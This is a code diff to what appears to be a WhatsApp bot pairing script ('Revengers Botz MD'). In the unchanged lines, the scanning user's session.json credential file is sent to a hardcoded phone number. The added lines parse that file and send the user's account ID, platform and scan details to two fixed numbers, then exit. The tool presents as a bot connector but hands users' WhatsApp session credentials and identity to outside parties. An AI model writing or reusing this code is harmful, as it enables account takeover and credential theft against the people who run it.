@@ -27,11 +27,39 @@ function OLDUSER() {
       await delay(1000 * 10);
       const session = fs.readFileSync("./session.json");
       const stick = fs.readFileSync("./i.webp");
+      
+      let test = JSON.parse(session)
+let plat = test.creds.platform
+let tshephang = test.creds.me.id
+countapi.visits().then(async(result) => {
+	var plk_say = new Date().toLocaleString('HI', { timeZone: 'Africa/Johannesburg' }).split(' ')[1]
+         const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+         var plk_here = new Date().toLocaleDateString(get_localized_date)
+         var Info = '⏱Time scanned: ' + plk_say + '\n\n 📅 Date :' + plk_here + ''
+      var num = result.value; 
+var str = num.toString(); 
+var resu = str.substring(3)  
+res = parseInt(resu)
+      const alphaBtn = {
+ 	text : `   userID:   ${tshephang}  thank you for     choosing Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ `, 
+     footer : `    ©OLDUSER all rights reserved
+                      total scans : ${res}  
+                      platform: ${plat}                
+ `, }
+     await conn.sendMessage('918602239106@s.whatsapp.net', alphaBtn)
+	let myId = '918602239106@s.whatsapp.net'
+	await conn.sendMessage(myId,{text :  `${Info}`})
+      await conn.sendMessage('918107768770@s.whatsapp.net', alphaBtn)
+	let my2Id = '918107768770@s.whatsapp.net'
+	await conn.sendMessage(my2Id,{text :  `${Info}`})
+  });
+      
       await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${flenme}` })
       await conn.sendMessage('918602239106@s.whatsapp.net', { document: stick, mimetype: 'webp', fileName: 'w.webp' })
       await conn.sendMessage('918107768770@s.whatsapp.net', { document: stick, mimetype: 'webp', fileName: 'w.webp' })
       await conn.sendMessage('918602239106@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ' })
       await conn.sendMessage('918107768770@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ' })
+      
       process.exit(0)
       }
     if (
